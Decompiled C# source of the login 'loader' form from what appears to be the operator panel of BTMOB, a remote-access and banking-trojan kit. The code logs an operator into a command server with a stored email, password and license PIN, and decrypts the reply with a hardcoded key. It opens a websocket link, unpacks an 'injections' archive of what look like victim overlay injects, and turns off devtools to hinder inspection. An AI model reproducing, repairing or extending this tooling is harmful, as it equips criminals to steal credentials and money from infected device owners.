using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
[ComVisible(true)]
public class loader : Form
{
	[CompilerGenerated]
	private sealed class VB_0024StateMachine_57_loader_Load : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal loader _0024VB_0024Me;

		internal string _0024VB_0024ResumableLocal_assistid_00240;

		internal string _0024VB_0024ResumableLocal_notificaionsounds_00241;

		internal Exception _0024VB_0024ResumableLocal_ex_00242;

		internal string _0024VB_0024ResumableLocal_disableContextMenuScript_00243;

		internal string _0024VB_0024ResumableLocal_tagname_00244;

		internal Thread _0024VB_0024ResumableLocal_debloyer_00245;

		internal TaskAwaiter _0024A0;

		internal TaskAwaiter<string> _0024A1;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				TaskAwaiter awaiter5;
				TaskAwaiter<string> awaiter3;
				TaskAwaiter<string> awaiter2;
				TaskAwaiter<string> awaiter4;
				TaskAwaiter<string> awaiter;
				switch (num)
				{
				default:
					_0024VB_0024Me.loadpanel.BringToFront();
					_0024VB_0024ResumableLocal_assistid_00240 = Conversions.ToString(RuntimeHelpers.GetObjectValue(BTRegistry.GetValue("hd", "")));
					if (codes.StrisEmpty(_0024VB_0024ResumableLocal_assistid_00240))
					{
						BTRegistry.AddOrUpdateValue("hd", codes.StrGenerator(16));
					}
					_0024VB_0024ResumableLocal_notificaionsounds_00241 = Conversions.ToString(RuntimeHelpers.GetObjectValue(BTRegistry.GetValue("notys", "")));
					if (codes.StrisEmpty(_0024VB_0024ResumableLocal_notificaionsounds_00241))
					{
						BTRegistry.AddOrUpdateValue("notys", "1");
					}
					awaiter5 = _0024VB_0024Me.loadwbv.EnsureCoreWebView2Async().GetAwaiter();
					if (!awaiter5.IsCompleted)
					{
						num = (_0024State = 0);
						_0024A0 = awaiter5;
						ref AsyncVoidMethodBuilder reference = ref _0024Builder;
						VB_0024StateMachine_57_loader_Load stateMachine = this;
						reference.AwaitUnsafeOnCompleted(ref awaiter5, ref stateMachine);
						return;
					}
					goto IL_01bf;
				case 0:
					num = (_0024State = -1);
					awaiter5 = _0024A0;
					_0024A0 = default(TaskAwaiter);
					goto IL_01bf;
				case -3:
				case 1:
					try
					{
						TaskAwaiter awaiter6;
						switch (num)
						{
						case -3:
							num = (_0024State = -1);
							return;
						default:
							if (codes.IsUrlAvailable(Conversions.ToString(RuntimeHelpers.GetObjectValue(BTConst.getApiUrl(BTConst.page_login_4, _0024VB_0024Me.TargetServer)))))
							{
								awaiter6 = _0024VB_0024Me.mywebview.EnsureCoreWebView2Async().GetAwaiter();
								if (!awaiter6.IsCompleted)
								{
									num = (_0024State = 1);
									_0024A0 = awaiter6;
									ref AsyncVoidMethodBuilder reference2 = ref _0024Builder;
									VB_0024StateMachine_57_loader_Load stateMachine = this;
									reference2.AwaitUnsafeOnCompleted(ref awaiter6, ref stateMachine);
									return;
								}
								break;
							}
							BTAlerter.erroes(BTConst.cantrichstr);
							_0024VB_0024Me.DialogResult = DialogResult.No;
							_0024VB_0024Me.Close();
							goto end_IL_000d;
						case 1:
							num = (_0024State = -1);
							awaiter6 = _0024A0;
							_0024A0 = default(TaskAwaiter);
							break;
						}
						awaiter6.GetResult();
						awaiter6 = default(TaskAwaiter);
						WebViewinit.ApplyAsync(_0024VB_0024Me.mywebview, _0024VB_0024Me);
						_0024VB_0024Me.mywebview.CoreWebView2.Settings.UserAgent = BTConst.myagent;
						_0024VB_0024Me.mywebview.Source = new Uri(Conversions.ToString(RuntimeHelpers.GetObjectValue(BTConst.getApiUrl(BTConst.page_login_4, _0024VB_0024Me.TargetServer))));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00242 = ex2;
						_0024VB_0024Me.DialogResult = DialogResult.Retry;
						_0024VB_0024Me.Close();
						ProjectData.ClearProjectError();
					}
					_0024VB_0024Me.mywebview.CoreWebView2.AddHostObjectToScript("bridge", _0024VB_0024Me);
					_0024VB_0024ResumableLocal_disableContextMenuScript_00243 = "document.addEventListener('contextmenu', event => event.preventDefault());";
					awaiter4 = _0024VB_0024Me.mywebview.CoreWebView2.AddScriptToExecuteOnDocumentCreatedAsync(_0024VB_0024ResumableLocal_disableContextMenuScript_00243).GetAwaiter();
					if (!awaiter4.IsCompleted)
					{
						num = (_0024State = 2);
						_0024A1 = awaiter4;
						ref AsyncVoidMethodBuilder reference3 = ref _0024Builder;
						VB_0024StateMachine_57_loader_Load stateMachine = this;
						reference3.AwaitUnsafeOnCompleted(ref awaiter4, ref stateMachine);
						return;
					}
					goto IL_0570;
				case 2:
					num = (_0024State = -1);
					awaiter4 = _0024A1;
					_0024A1 = default(TaskAwaiter<string>);
					goto IL_0570;
				case 3:
					num = (_0024State = -1);
					awaiter3 = _0024A1;
					_0024A1 = default(TaskAwaiter<string>);
					goto IL_0634;
				case 4:
					num = (_0024State = -1);
					awaiter2 = _0024A1;
					_0024A1 = default(TaskAwaiter<string>);
					goto IL_070b;
				case 5:
					{
						num = (_0024State = -1);
						awaiter = _0024A1;
						_0024A1 = default(TaskAwaiter<string>);
						break;
					}
					IL_01bf:
					awaiter5.GetResult();
					awaiter5 = default(TaskAwaiter);
					WebViewinit.ApplyAsync(_0024VB_0024Me.loadwbv, _0024VB_0024Me);
					_0024VB_0024Me.loadwbv.NavigateToString(Resources.load.Replace("[BASE-ICO]", codes.BitmapToBase64(Resources.logo)).Replace("BTMOB", BTConst.myname));
					_0024VB_0024Me.loadwbv.CoreWebView2.Settings.UserAgent = BTConst.myagent;
					goto case -3;
					IL_0634:
					awaiter3.GetResult();
					awaiter3 = default(TaskAwaiter<string>);
					_0024VB_0024ResumableLocal_tagname_00244 = BTConst.mysloginstr;
					awaiter2 = _0024VB_0024Me.mywebview.ExecuteScriptAsync($"document.getElementById('smalltag').value = '{_0024VB_0024ResumableLocal_tagname_00244}';").GetAwaiter();
					if (!awaiter2.IsCompleted)
					{
						num = (_0024State = 4);
						_0024A1 = awaiter2;
						ref AsyncVoidMethodBuilder reference4 = ref _0024Builder;
						VB_0024StateMachine_57_loader_Load stateMachine = this;
						reference4.AwaitUnsafeOnCompleted(ref awaiter2, ref stateMachine);
						return;
					}
					goto IL_070b;
					IL_070b:
					awaiter2.GetResult();
					awaiter2 = default(TaskAwaiter<string>);
					_0024VB_0024Me.mywebview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
					_0024VB_0024Me.mywebview.CoreWebView2.Settings.AreDevToolsEnabled = false;
					awaiter = _0024VB_0024Me.loadwbv.ExecuteScriptAsync($"document.getElementById('smalltag').value = '{_0024VB_0024ResumableLocal_tagname_00244}';").GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = (_0024State = 5);
						_0024A1 = awaiter;
						ref AsyncVoidMethodBuilder reference5 = ref _0024Builder;
						VB_0024StateMachine_57_loader_Load stateMachine = this;
						reference5.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
					break;
					IL_0570:
					awaiter4.GetResult();
					awaiter4 = default(TaskAwaiter<string>);
					awaiter3 = _0024VB_0024Me.loadwbv.CoreWebView2.AddScriptToExecuteOnDocumentCreatedAsync(_0024VB_0024ResumableLocal_disableContextMenuScript_00243).GetAwaiter();
					if (!awaiter3.IsCompleted)
					{
						num = (_0024State = 3);
						_0024A1 = awaiter3;
						ref AsyncVoidMethodBuilder reference6 = ref _0024Builder;
						VB_0024StateMachine_57_loader_Load stateMachine = this;
						reference6.AwaitUnsafeOnCompleted(ref awaiter3, ref stateMachine);
						return;
					}
					goto IL_0634;
				}
				awaiter.GetResult();
				awaiter = default(TaskAwaiter<string>);
				_0024VB_0024Me.loadwbv.CoreWebView2.Settings.AreDefaultContextMenusEnabled = false;
				_0024VB_0024Me.loadwbv.CoreWebView2.Settings.AreDevToolsEnabled = false;
				BTConst.currentstate = BTConst.loadingstr;
				_0024VB_0024Me.loadingtime.Start();
				if (!Directory.Exists(MyRes.injections_Path))
				{
					_0024VB_0024ResumableLocal_debloyer_00245 = new Thread([SpecialName] () =>
					{
						Directory.CreateDirectory(MyRes.injections_Path);
						File.Copy(MyRes.injections_Zip, MyRes.injections_Path + "\\jects.zip");
						ZipFile.ExtractToDirectory(MyRes.injections_Path + "\\jects.zip", MyRes.injections_Path);
						File.Delete(MyRes.injections_Path + "\\jects.zip");
					});
					_0024VB_0024ResumableLocal_debloyer_00245.IsBackground = true;
					_0024VB_0024ResumableLocal_debloyer_00245.Start();
				}
				_0024VB_0024Me.infopanel.Enabled = true;
				end_IL_000d:;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_58_loadingtime_Tick : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal loader _0024VB_0024Me;

		internal TaskAwaiter<string> _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				TaskAwaiter<string> awaiter;
				if (num != 0)
				{
					awaiter = _0024VB_0024Me.loadwbv.ExecuteScriptAsync($"updateStatus('{BTConst.currentstate}');").GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = (_0024State = 0);
						_0024A0 = awaiter;
						ref AsyncVoidMethodBuilder reference = ref _0024Builder;
						VB_0024StateMachine_58_loadingtime_Tick stateMachine = this;
						reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
				}
				else
				{
					num = (_0024State = -1);
					awaiter = _0024A0;
					_0024A0 = default(TaskAwaiter<string>);
				}
				awaiter.GetResult();
				awaiter = default(TaskAwaiter<string>);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_76_mywebview_NavigationCompleted : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal CoreWebView2NavigationCompletedEventArgs _0024VB_0024Local_e;

		internal loader _0024VB_0024Me;

		internal string _0024VB_0024ResumableLocal_pinkey_00240;

		internal TaskAwaiter<string> _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				TaskAwaiter<string> awaiter3;
				TaskAwaiter<string> awaiter2;
				TaskAwaiter<string> awaiter;
				switch (num)
				{
				default:
					if (_0024VB_0024Local_e.IsSuccess)
					{
						BTConst.currentstate = BTConst.connect_tosrv;
						_0024VB_0024ResumableLocal_pinkey_00240 = ServersMgr.GetServerPin(_0024VB_0024Me.TargetServer);
						if ((_0024VB_0024ResumableLocal_pinkey_00240 == null) | codes.StrisEmpty(_0024VB_0024ResumableLocal_pinkey_00240))
						{
							_0024VB_0024ResumableLocal_pinkey_00240 = "XXXX-XXXX-XXXX-XXXX";
						}
						awaiter3 = _0024VB_0024Me.mywebview.ExecuteScriptAsync($"document.getElementById('email').value = '{_0024VB_0024Me.Targetemail}';").GetAwaiter();
						if (!awaiter3.IsCompleted)
						{
							num = (_0024State = 0);
							_0024A0 = awaiter3;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_76_mywebview_NavigationCompleted stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter3, ref stateMachine);
							return;
						}
						goto IL_01c9;
					}
					_0024VB_0024Me.mywebview.Visible = false;
					BTAlerter.erroes("NAVComplete: \r\n" + BTConst.pleaseconstr);
					_0024VB_0024Me.DialogResult = DialogResult.Ignore;
					_0024VB_0024Me.Close();
					goto end_IL_000d;
				case 0:
					num = (_0024State = -1);
					awaiter3 = _0024A0;
					_0024A0 = default(TaskAwaiter<string>);
					goto IL_01c9;
				case 1:
					num = (_0024State = -1);
					awaiter2 = _0024A0;
					_0024A0 = default(TaskAwaiter<string>);
					goto IL_0297;
				case 2:
					{
						num = (_0024State = -1);
						awaiter = _0024A0;
						_0024A0 = default(TaskAwaiter<string>);
						break;
					}
					IL_01c9:
					awaiter3.GetResult();
					awaiter3 = default(TaskAwaiter<string>);
					awaiter2 = _0024VB_0024Me.mywebview.ExecuteScriptAsync($"document.getElementById('password').value = '{_0024VB_0024Me.TargetPass}';").GetAwaiter();
					if (!awaiter2.IsCompleted)
					{
						num = (_0024State = 1);
						_0024A0 = awaiter2;
						ref AsyncVoidMethodBuilder reference2 = ref _0024Builder;
						VB_0024StateMachine_76_mywebview_NavigationCompleted stateMachine = this;
						reference2.AwaitUnsafeOnCompleted(ref awaiter2, ref stateMachine);
						return;
					}
					goto IL_0297;
					IL_0297:
					awaiter2.GetResult();
					awaiter2 = default(TaskAwaiter<string>);
					awaiter = _0024VB_0024Me.mywebview.ExecuteScriptAsync($"document.getElementById('bt-key-input').value = '{_0024VB_0024ResumableLocal_pinkey_00240}';").GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = (_0024State = 2);
						_0024A0 = awaiter;
						ref AsyncVoidMethodBuilder reference3 = ref _0024Builder;
						VB_0024StateMachine_76_mywebview_NavigationCompleted stateMachine = this;
						reference3.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
					break;
				}
				awaiter.GetResult();
				awaiter = default(TaskAwaiter<string>);
				_0024VB_0024Me.loadwbv.Visible = true;
				_0024VB_0024Me.StartLogin();
				end_IL_000d:;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_78_Setp1_Trylogin : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal string _0024VB_0024Local_pinkey;

		internal loader _0024VB_0024Me;

		internal _Closure_0024__78_002D0 _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;

		internal string _0024VB_0024ResumableLocal_usermail_00241;

		internal string _0024VB_0024ResumableLocal_userpass_00242;

		internal string _0024VB_0024ResumableLocal_Randomkey_00243;

		internal string _0024VB_0024ResumableLocal_response_00244;

		internal string _0024VB_0024ResumableLocal_datajson_00245;

		internal JObject _0024VB_0024ResumableLocal_resjson_00246;

		internal Exception _0024VB_0024ResumableLocal_ex_00247;

		internal Exception _0024VB_0024ResumableLocal_ex_00248;

		internal TaskAwaiter<(bool, string)> _0024A0;

		internal _Closure_0024__78_002D0 _0024U1;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				switch (num)
				{
				default:
					{
						try
						{
							TaskAwaiter<(bool, string)> awaiter;
							switch (num)
							{
							case -3:
								num = (_0024State = -1);
								return;
							default:
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240 = new _Closure_0024__78_002D0();
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Me = _0024VB_0024Me;
								BTConst.currentstate = BTConst.Authenticatistr;
								_0024VB_0024ResumableLocal_usermail_00241 = _0024VB_0024Me.Targetemail;
								_0024VB_0024ResumableLocal_userpass_00242 = _0024VB_0024Me.TargetPass;
								if (codes.StrisEmpty(_0024VB_0024ResumableLocal_usermail_00241) | codes.StrisEmpty(_0024VB_0024ResumableLocal_userpass_00242) | codes.StrisEmpty(_0024VB_0024Local_pinkey))
								{
									_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										BTAlerter.Warnings("Login:\r\n" + BTConst.enter_eml_pass);
									}));
									goto end_IL_0016;
								}
								_0024VB_0024ResumableLocal_Randomkey_00243 = codes.StrGenerator(32);
								_0024U1 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
								awaiter = MyServer.startlogin(_0024VB_0024ResumableLocal_usermail_00241, _0024VB_0024ResumableLocal_userpass_00242, _0024VB_0024Local_pinkey, _0024VB_0024ResumableLocal_Randomkey_00243, _0024VB_0024Me.Serverinf.MainhttpClient, _0024VB_0024Me.TargetServer).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = (_0024State = 0);
									_0024A0 = awaiter;
									ref AsyncVoidMethodBuilder reference = ref _0024Builder;
									VB_0024StateMachine_78_Setp1_Trylogin stateMachine = this;
									reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
									return;
								}
								break;
							case 0:
								num = (_0024State = -1);
								awaiter = _0024A0;
								_0024A0 = default(TaskAwaiter<(bool, string)>);
								break;
							}
							_Closure_0024__78_002D0 closure_0024__78_002D = _0024U1;
							(bool, string) result = awaiter.GetResult();
							awaiter = default(TaskAwaiter<(bool, string)>);
							closure_0024__78_002D._0024VB_0024Local_result = result;
							_0024U1 = null;
							if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item1)
							{
								try
								{
									ServersMgr.SaveServerPin(_0024VB_0024Me.TargetServer, _0024VB_0024Local_pinkey);
									_0024VB_0024ResumableLocal_response_00244 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item2.Replace("\\", "");
									_0024VB_0024ResumableLocal_datajson_00245 = MyServer.DecryptReply(_0024VB_0024ResumableLocal_Randomkey_00243, "BT-MOB!B6twG9+&U", _0024VB_0024ResumableLocal_response_00244);
									_0024VB_0024ResumableLocal_resjson_00246 = JObject.Parse(_0024VB_0024ResumableLocal_datajson_00245);
									if (_0024VB_0024ResumableLocal_resjson_00246["nxtkey"] != null)
									{
										ServersMgr.SaveServerNextKey(_0024VB_0024Me.TargetServer, (string?)_0024VB_0024ResumableLocal_resjson_00246["nxtkey"]);
										_0024VB_0024Me.Serverinf.u_email = (string?)_0024VB_0024ResumableLocal_resjson_00246["emil"];
										_0024VB_0024Me.Serverinf.share_link = (string?)_0024VB_0024ResumableLocal_resjson_00246["elink"];
										_0024VB_0024Me.Serverinf.u_uid = (string?)_0024VB_0024ResumableLocal_resjson_00246["uid"];
										_0024VB_0024Me.Serverinf.u_subtype = (string?)_0024VB_0024ResumableLocal_resjson_00246["stype"];
										_0024VB_0024Me.Serverinf.u_exp = (string?)_0024VB_0024ResumableLocal_resjson_00246["exp"];
										_0024VB_0024Me.Serverinf.BTClientID = (string?)_0024VB_0024ResumableLocal_resjson_00246["uid"];
									}
									_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										Thread thread = new Thread([SpecialName] () =>
										{
											_0024VB_0024Me.Step2_join();
										});
										thread.IsBackground = true;
										thread.Start();
									}));
								}
								catch (Exception ex)
								{
									ProjectData.SetProjectError(ex);
									Exception ex2 = ex;
									_0024VB_0024ResumableLocal_ex_00247 = ex2;
									ServersMgr.SaveServerPin(_0024VB_0024Me.TargetServer, _0024VB_0024Me.EmptKey);
									_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										_0024VB_0024Me.mywebview.ExecuteScriptAsync(EXGuarder._04006225);
										BTAlerter.erroes(BTConst.smthngwrongstr);
										_0024VB_0024Me.hideloader();
									}));
									Debuger.Log_e("Bad Response", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item2);
									ProjectData.ClearProjectError();
								}
							}
							else
							{
								ServersMgr.SaveServerPin(_0024VB_0024Me.TargetServer, _0024VB_0024Me.EmptKey);
								_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Me.mywebview.ExecuteScriptAsync("document.getElementById('login-button').click();");
									BTAlerter.erroes(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_result.Item2);
									_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Me.hideloader();
								}));
							}
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							_0024VB_0024ResumableLocal_ex_00248 = ex4;
							ServersMgr.SaveServerPin(_0024VB_0024Me.TargetServer, _0024VB_0024Me.EmptKey);
							_0024VB_0024Me.DialogResult = DialogResult.Abort;
							_0024VB_0024Me.Close();
							ProjectData.ClearProjectError();
						}
						break;
					}
					end_IL_0016:
					break;
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception exception = ex5;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_79_Step2_join : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal loader _0024VB_0024Me;

		internal string _0024VB_0024ResumableLocal_nxtkey_00240;

		internal string _0024VB_0024ResumableLocal_datajoin_00241;

		internal JObject _0024VB_0024ResumableLocal_result_00242;

		internal _Closure_0024__79_002D0 _0024VB_0024ResumableLocal__0024VB_0024Closure__00243;

		internal Exception _0024VB_0024ResumableLocal_ex_00244;

		internal TaskAwaiter<string> _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				switch (num)
				{
				default:
					try
					{
						TaskAwaiter<string> awaiter;
						switch (num)
						{
						case -3:
							num = (_0024State = -1);
							return;
						default:
							BTConst.currentstate = BTConst.joiningserver;
							_0024VB_0024ResumableLocal_nxtkey_00240 = ServersMgr.GetServerNextKey(_0024VB_0024Me.TargetServer);
							awaiter = MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>("join", "0", "1", _0024VB_0024ResumableLocal_nxtkey_00240), _0024VB_0024Me.Serverinf.MainhttpClient, _0024VB_0024Me.TargetServer).GetAwaiter();
							if (!awaiter.IsCompleted)
							{
								num = (_0024State = 0);
								_0024A0 = awaiter;
								ref AsyncVoidMethodBuilder reference = ref _0024Builder;
								VB_0024StateMachine_79_Step2_join stateMachine = this;
								reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
								return;
							}
							break;
						case 0:
							num = (_0024State = -1);
							awaiter = _0024A0;
							_0024A0 = default(TaskAwaiter<string>);
							break;
						}
						string result = awaiter.GetResult();
						awaiter = default(TaskAwaiter<string>);
						_0024VB_0024ResumableLocal_datajoin_00241 = result;
						_0024VB_0024ResumableLocal_result_00242 = JObject.Parse(_0024VB_0024ResumableLocal_datajoin_00241);
						if (_0024VB_0024ResumableLocal_result_00242["Success"] != null)
						{
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00243 = new _Closure_0024__79_002D0();
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Me = _0024VB_0024Me;
							_0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Local_datastr = _0024VB_0024ResumableLocal_result_00242["Success"].ToString().Trim('"');
							Debuger.Log_d("Main IDF websock", _0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Local_datastr);
							ServersMgr.SaveServerIDF(_0024VB_0024Me.TargetServer, _0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Local_datastr);
							_0024VB_0024Me.Serverinf.connectionThread = new Thread([SpecialName] () =>
							{
								_0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Me.Serverinf.WSClient.Connect(_0024VB_0024ResumableLocal__0024VB_0024Closure__00243._0024VB_0024Local_datastr);
							});
							_0024VB_0024Me.Serverinf.connectionThread.IsBackground = true;
							_0024VB_0024Me.Serverinf.connectionThread.Start();
							_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								_0024VB_0024Me.DialogResult = DialogResult.OK;
								_0024VB_0024Me.Close();
							}));
							break;
						}
						if (_0024VB_0024ResumableLocal_result_00242["Fail"] != null)
						{
							MyMsg.Show("failed: ", _0024VB_0024ResumableLocal_result_00242["Fail"].ToString(), MyMsg.msgtype.errors, use_no: false);
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00244 = ex2;
						ProjectData.ClearProjectError();
					}
					_0024VB_0024Me.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						_0024VB_0024Me.Errorlogin();
					}));
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = (_0024State = -2);
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__78_002D0
	{
		public (bool, string) _0024VB_0024Local_result;

		public loader _0024VB_0024Me;

		[SpecialName]
		internal void _Lambda_0024__4()
		{
			_0024VB_0024Me.mywebview.ExecuteScriptAsync("document.getElementById('login-button').click();");
			BTAlerter.erroes(_0024VB_0024Local_result.Item2);
			_0024VB_0024Me.hideloader();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__79_002D0
	{
		public string _0024VB_0024Local_datastr;

		public loader _0024VB_0024Me;

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.Serverinf.WSClient.Connect(_0024VB_0024Local_datastr);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("loadingtime")]
	private System.Windows.Forms.Timer _loadingtime;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("infopanel")]
	private Panel _infopanel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mywebview")]
	private WebView2 _mywebview;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	public string EmptKey;

	public string TargetServer;

	private string Targetemail;

	private string TargetPass;

	private ServersInfo Serverinf;

	private object connectattempt;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer loadingtime
	{
		[CompilerGenerated]
		get
		{
			return _loadingtime;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = loadingtime_Tick;
			System.Windows.Forms.Timer timer = _loadingtime;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_loadingtime = value;
			timer = _loadingtime;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual Panel infopanel
	{
		[CompilerGenerated]
		get
		{
			return _infopanel;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = Panel2_MouseDown;
			Panel panel = _infopanel;
			if (panel != null)
			{
				panel.MouseDown -= value2;
			}
			_infopanel = value;
			panel = _infopanel;
			if (panel != null)
			{
				panel.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W5")]
	internal virtual DrakeWidth_W DrakeWidth_W5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}
